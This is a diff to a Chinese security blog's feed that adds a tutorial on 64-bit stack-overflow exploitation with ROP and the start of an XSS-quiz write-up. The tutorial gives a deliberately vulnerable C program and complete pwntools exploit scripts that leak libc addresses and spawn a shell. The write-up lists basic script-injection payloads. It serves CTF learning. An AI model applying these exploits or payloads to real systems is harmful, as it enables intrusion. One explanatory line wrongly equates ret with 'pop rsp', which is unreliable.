@@ -106,6 +106,108 @@
   </entry>
   
   <entry>
+    <title>ROP学习：64位栈溢出</title>
+    <link href="http://yoursite.com/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    <id>http://yoursite.com/2017/06/26/ROP学习：64位栈溢出/</id>
+    <published>2017-06-26T11:44:03.000Z</published>
+    <updated>2017-06-27T02:22:58.618Z</updated>
+    
+    <content type="html"><![CDATA[<p>web狗的二进制之路。<br><a id="more"></a></p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>c程序 test.c ：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">0x50</span>];</div><div class="line">    read(<span class="number">0</span>, name, <span class="number">0x100</span>);</div><div class="line">    write(<span class="number">1</span>, name, <span class="number">0x100</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    func();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.c -o pwn -O0 -fno-stack-protector</div></pre></td></tr></table></figure></p>
+<p>选项 <code>-O0</code> 表示不进行任何优化， <code>-fno-stack-protector</code>表示无canary保护。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>C语言调用机制使用了栈数据结构，先进后出。同时栈是由高地址向低地址增长。</p>
+<p>在64位环境下，函数的调用所需要的参数是优先通过寄存器来进行的。寄存器的顺序如下：rdi,rsi,rdx,rcx,r8,r9。当一个函数有大于6个整形参数，则超出的部分会通过栈来传递，这个情况少见。</p>
+<p>64位环境下，还有几个特殊的指针（寄存器）：rip、rbp和rsp。其中rip是指令指针，cpu会把rip指向的内容当作指令执行。rbp指向当前栈帧的底部。rsp指向当前栈帧的顶部。</p>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>由于64位下，是优先通过寄存器来传参，所以不能像在32位环境下直接去布置栈上的数据来exp。这时需要用到ROP技术(Retrun-oriented Programmming)，从可执行文件或者库中提取部分代码片段来进行恶意利用。</p>
+<p>比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如<code>pop rdi;ret</code>的代码片段，从而在执行完<code>pop rdi</code>后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret）</p>
+<p>常见的寻找ROP的工具有很多，这里使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPgadget</a>。以前面的例子为例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary &quot;pwn&quot; --only &quot;pop|ret&quot;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170626/1.jpg?raw=true" alt=""></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们的测试程序是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">0x50</span>];</div><div class="line">    read(<span class="number">0</span>, name, <span class="number">0x100</span>);</div><div class="line">    write(<span class="number">1</span>, name, <span class="number">0x100</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    func();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>有非常明显的栈溢出漏洞，read从标准输入流（0）读取0x100放到name里面，之后write从name中读取长度为0x100的字节输出到屏幕（1）。我们可以通过输入，从而去覆盖func（）的返回地址，从而劫持控制流。</p>
+<p>为能找到溢出点，可以使用pattern.py来测试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/test$ pattern 100</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</div></pre></td></tr></table></figure></p>
+<p>接着利用gdb，在运行（r）后输入上述生成的字符串，此时gdb发生段错误。因为是在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为<code>ret</code>指令，相当于<code>pop rsp</code>，所以只要看一下<code>rsp</code>的值，就知道跳转的地址，从而知道溢出点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffdc98:	0x3164413064413963</div><div class="line"></div><div class="line">.......</div><div class="line"></div><div class="line">(venv) chybeta@ubuntu:~/pwn/test$ pattern 0x3164413064413963</div><div class="line">Pattern 0x3164413064413963 first occurrence at position 88 in pattern.</div></pre></td></tr></table></figure></p>
+<p>所以，溢出点是88个字节。</p>
+<h2 id="提供libc"><a href="#提供libc" class="headerlink" title="提供libc"></a>提供libc</h2><h3 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h3><p>用ldd命令可以看到pwn程序运行时使用的libc.so。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/test$ ldd pwn</div><div class="line">	linux-vdso.so.1 =&gt;  (0x00007ffeb7d64000)</div><div class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb139e93000)</div><div class="line">	/lib64/ld-linux-x86-64.so.2 (0x00005602037ac000)</div></pre></td></tr></table></figure></p>
+<p>将<code>/lib/x86_64-linux-gnu/libc.so.6</code>拷贝到当前目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp /lib/x86_64-linux-gnu/libc.so.6 libc.so</div></pre></td></tr></table></figure></p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>提供了libc.so，可以计算出read函数与system函数和sh字符串的偏移量。</li>
+<li>利用write函数泄露出read函数的地址，从而计算system函数和sh字符串的真实地址。</li>
+<li>调用system函数，并传入参数，即sh字符串。</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><p>接下去根据exp进行一下详细的讲解。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">libc = ELF(<span class="string">"libc.so"</span>)  <span class="comment"># 题目提供</span></div></pre></td></tr></table></figure></p>
+<p>offset偏移由pattern.py和gdb计算得出。read与system地址和sh地址由提供的libc，结合pwntools得到。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">offset = <span class="number">88</span>  </div><div class="line">offset_read_system = libc.symbols[<span class="string">"read"</span>] - libc.symbols[<span class="string">"system"</span>]</div><div class="line">offset_read_binsh =  libc.symbols[<span class="string">"read"</span>] - next(libc.search(<span class="string">"/bin/sh\x00"</span>))</div><div class="line">log.success(<span class="string">"offset_read_system =&gt; &#123;&#125;"</span>.format(hex(offset_read_system)))</div><div class="line">log.success(<span class="string">"offset_read_binsh =&gt; &#123;&#125;"</span>.format(hex(offset_read_binsh)))</div></pre></td></tr></table></figure>
+<p>两个地址，由ROPgadget得到，用于参数的传递。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div></pre></td></tr></table></figure>
+<p>利用write函数泄露read函数地址。<code>&#39;a&#39;*offset</code>后到溢出点return跳到执行<code>pop rdi</code>，此时栈顶的数据为1，pop完后1被保存在寄存器rdi中，作为write的第一个参数。之后返回（ret）跳转到执行<code>pop rsi</code>，此时栈顶的数据为read函数的plt表地址，pop完后，其地址被保存在rsi中，作为write的第二个参数。接下去要执行pop r15，没有什么用，所以我们随便写一个p64（1）进去。再接下去就是ret（返回）跳转到func函数，以便进行下一次利用。为什么我们没有设置write的第三个参数呢？？？ 见下文。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(elf.got[<span class="string">"read"</span>])</div><div class="line">payload += p64(<span class="number">1</span>)    </div><div class="line">payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div></pre></td></tr></table></figure>
+<p>发送payload后，先执行了正常的write函数流程，注意源程序中的write的第三个参数是0x100，所以需要先p.recv(0x100)，之后由于func的返回地址被覆盖了，程序流程会进入我们设置好的rop中。在rop链中，我们修改了write的前两个参数，此时write的函数调用如下：write(1,read_plt_addr,0x100)。我们的目的是获得read函数的地址，在64位环境下为8个字节，所以只需要截取write输出的前8个字节，即read_addr = u64（p.recv(8)）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">read_addr = u64(p.recv(<span class="number">8</span>))</div></pre></td></tr></table></figure>
+<p>获取了read函数地址后，就可以计算system（）函数和字符串sh的地址了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">system_addr = read_addr - offset_read_system</div><div class="line">binsh_addr = read_addr - offset_read_binsh</div><div class="line">log.success(<span class="string">"read_addr =&gt; &#123;&#125; "</span>.format(hex(read_addr)))</div><div class="line">log.success(<span class="string">'system_addr =&gt; &#123;&#125;'</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"binsh_addr =&gt; &#123;&#125;"</span>.format(hex(binsh_addr)))</div></pre></td></tr></table></figure>
+<p>第一次rop结束后，我们让它ret到func函数，接下来构造新的rop。同样利用<code>&#39;a&#39;*offset</code>先溢出到return，通过<code>pop rdi</code>，将sh字符串的地址保存到寄存器rdi中，作为system（）函数的参数。之后是ret，直接返回到system（）函数的地址，从而成功getshell（）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170626/2.gif?raw=true" alt=""></p>
+<p>附上完整的exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">libc = ELF(<span class="string">"libc.so"</span>)</div><div class="line">offset = <span class="number">88</span></div><div class="line">offset_read_system = libc.symbols[<span class="string">"read"</span>] - libc.symbols[<span class="string">"system"</span>]</div><div class="line">offset_read_binsh =  libc.symbols[<span class="string">"read"</span>] - next(libc.search(<span class="string">"/bin/sh\x00"</span>))</div><div class="line">log.success(<span class="string">"offset_read_system =&gt; &#123;&#125;"</span>.format(hex(offset_read_system)))</div><div class="line">log.success(<span class="string">"offset_read_binsh =&gt; &#123;&#125;"</span>.format(hex(offset_read_binsh)))</div><div class="line"></div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(elf.got[<span class="string">"read"</span>])</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">read_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line">log.success(<span class="string">"read_addr =&gt; &#123;&#125; "</span>.format(hex(read_addr)))</div><div class="line">system_addr = read_addr - offset_read_system</div><div class="line">binsh_addr = read_addr - offset_read_binsh</div><div class="line">log.success(<span class="string">'system_addr =&gt; &#123;&#125;'</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"binsh_addr =&gt; &#123;&#125;"</span>.format(hex(binsh_addr)))</div><div class="line"></div><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="不提供libc"><a href="#不提供libc" class="headerlink" title="不提供libc"></a>不提供libc</h2><p>若题目没有提供libc的话，需要利用pwntool中的DynELF来泄露地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">libc = ELF(<span class="string">"libc.so"</span>)</div><div class="line">offset = <span class="number">88</span></div><div class="line"></div><div class="line"><span class="comment"># offset_read_system = libc.symbols["read"] - libc.symbols["system"]</span></div><div class="line"><span class="comment"># offset_read_binsh =  libc.symbols["read"] - next(libc.search("/bin/sh\x00"))</span></div><div class="line"><span class="comment"># log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))</span></div><div class="line"><span class="comment"># log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh)))</span></div><div class="line"></div><div class="line">bss_addr = elf.bss()</div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">'leak address =&gt; &#123;&#125; '</span>.format(hex(address)))</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">	payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	p.recv()</div><div class="line"></div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(start_addr)</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line"></div><div class="line">d = DynELF(leak, elf = ELF(<span class="string">'./pwn'</span>))</div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">read_addr = d.lookup(<span class="string">"read"</span>,<span class="string">"libc"</span>)</div><div class="line">log.success(<span class="string">"system dynelf address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"read dynelf address =&gt; &#123;&#125;"</span>.format(hex(read_addr)))</div><div class="line"><span class="comment"># binsh_addr = read_addr - offset_read_binsh</span></div><div class="line"><span class="comment"># log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr)))</span></div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(start_addr)</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_addr)</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;web狗的二进制之路。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>xss-quiz-writeup</title>
+    <link href="http://yoursite.com/2017/06/25/xss-quiz-writeup/"/>
+    <id>http://yoursite.com/2017/06/25/xss-quiz-writeup/</id>
+    <published>2017-06-25T11:25:11.000Z</published>
+    <updated>2017-06-25T15:31:34.928Z</updated>
+    
+    <content type="html"><![CDATA[<p>xss-quiz： <a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">http://xss-quiz.int21h.jp/</a><br><a id="more"></a></p>
+<h1 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<h1 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h1><p><a href="http://xss-quiz.int21h.jp/stage2.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php</a></p>
+<p>尝试如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>无反应，查看源代码：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true" alt=""></p>
+<p>需要闭合前面value的双引号，所以最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</div></pre></td></tr></table></figure></p>
+<h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p>多了一个选择country的功能，经过测试可知，过滤了尖括号。<br><img src="" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;xss-quiz： &lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;http://xss-quiz.int21h.jp/&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
+    
+  </entry>
+  
+  <entry>
     <title>GCTF-web-writeup</title>
     <link href="http://yoursite.com/2017/06/19/GCTF-web-writeup/"/>
     <id>http://yoursite.com/2017/06/19/GCTF-web-writeup/</id>
@@ -405,11 +507,11 @@
       <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
     
     
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
       <category term="php" scheme="http://yoursite.com/tags/php/"/>
     
       <category term="弱类型" scheme="http://yoursite.com/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -935,135 +1037,6 @@
       <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
       <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>win下tensorflow安装避坑指南</title>
-    <link href="http://yoursite.com/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/"/>
-    <id>http://yoursite.com/2017/03/15/win下tensorflow安装避坑指南-0/</id>
-    <published>2017-03-15T05:02:29.000Z</published>
-    <updated>2017-06-20T03:29:48.889Z</updated>
-    
-    <content type="html"><![CDATA[<p>好多同学来问怎么安装tensorflow，想想还是写一下吧。<br><a id="more"></a></p>
-<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><ul>
-<li>可以选择使用 virtualenv 来进行python环境的管理,这样不会混乱。</li>
-<li>担心包与包之间的依赖问题的话，推荐直接使用 anaconda科学计算发行包。具体安装过程可参见：<a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装 </a></li>
-</ul>
-<h1 id="原生python安装"><a href="#原生python安装" class="headerlink" title="原生python安装"></a>原生python安装</h1><p>想想还是把这部分加进来了：）</p>
-<h2 id="避坑一：官网下载"><a href="#避坑一：官网下载" class="headerlink" title="避坑一：官网下载"></a>避坑一：官网下载</h2><p>下载页面：<a href="https://www.python.org/downloads/windows/" target="_blank" rel="external">https://www.python.org/downloads/windows/</a><br>tensorflow官网上面说:tensorflow暂时只支持64bit的python3.5。所以不想折腾的同学不要去下载latest的python3.6，也不要去下python2.7，毕竟py3是未来啊。。<br><img src="http://ojp0pjljj.bkt.clouddn.com/tensor1.jpg" alt=""></p>
-<p>executable installer是把安装文件下载下来后再安装。</p>
-<h2 id="避坑二：安装python"><a href="#避坑二：安装python" class="headerlink" title="避坑二：安装python"></a>避坑二：安装python</h2><p>不想后面麻烦的话，安装时记得把 添加进系统路径 选上<br><img src="http://ojp0pjljj.bkt.clouddn.com/tensor2.jpg" alt=""><br>其余的选项不用担心，你可以自己选择安装路径，这里我直接选 Install Now了。</p>
-<h2 id="避坑三：试试"><a href="#避坑三：试试" class="headerlink" title="避坑三：试试"></a>避坑三：试试</h2><p>打开cmd，输入python，应该会进入python交互式环境。<br><img src="http://ojp0pjljj.bkt.clouddn.com/tensor3.jpg" alt=""><br>如果提示不是内部或外部命令啥的，说明你的系统环境变量配置有问题。可以自己再手动添加进去，这里不提。</p>
-<p>另外说一下，这里默认的python命令对应的版本为python3.5。</p>
-<h1 id="安装tensorflow"><a href="#安装tensorflow" class="headerlink" title="安装tensorflow"></a>安装tensorflow</h1><h2 id="避坑四：安装命令"><a href="#避坑四：安装命令" class="headerlink" title="避坑四：安装命令"></a>避坑四：安装命令</h2><p>python3.5自带的pip3包管理器，我可以直接使用它来下载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 install --upgrade tensorflow</div></pre></td></tr></table></figure></p>
-<p>它会自动下载tensorflow及其它一些最新的依赖包。记得加上 —upgrade，不然安装的比如protobuf的版本可能相对较低后续可能会报错。然后会自动进行安装。直至如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/tensor4.jpg" alt=""></p>
